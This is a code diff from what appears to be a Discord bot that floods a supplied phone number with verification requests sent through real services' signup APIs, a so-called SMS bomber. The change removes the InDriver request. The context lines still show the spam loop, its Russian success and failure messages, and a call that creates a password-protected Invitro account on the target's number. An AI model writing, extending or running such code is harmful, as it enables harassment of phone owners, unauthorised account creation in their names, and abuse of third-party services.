@@ -211,11 +211,6 @@ async def on_message(message):
 			except:
 				await channel.send('[-] Не отправлено!')
 
-			try:
-				requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
-				await channel.send('[+] InDriver отправлено!')
-			except:
-				await channel.send('[-] Не отправлено!')
 
 			try:
 				requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + phone})
